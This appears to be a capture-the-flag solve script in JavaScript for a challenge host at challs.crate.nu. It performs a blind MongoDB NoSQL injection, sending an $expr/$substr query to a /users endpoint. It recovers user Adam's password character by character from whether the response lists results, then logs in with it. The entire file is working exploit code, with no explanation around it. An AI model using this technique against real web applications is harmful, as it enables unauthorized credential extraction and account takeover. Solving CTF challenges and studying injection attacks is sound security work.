let password = "";
outer: while (true) {
    for (let c of "0123456789abcdef-") {
        let res = await fetch("http://challs.crate.nu:47896/users", {
            method: "post",
            body: JSON.stringify({
                name: "Adam",
                $expr: { $eq: [c, { $substr: ["$password", password.length, 1] }] }
            }),
        });
        let text = await res.text();

        if (text.includes("<li>")) {
            password += c;
            console.log(password);
            continue outer;
        }
    }
    break;
}

let res = await fetch("http://challs.crate.nu:47896/login", {
    method: "post",
    body: JSON.stringify({
        name: "Adam",
        password,
    }),
});
console.log(await res.text());

export {};
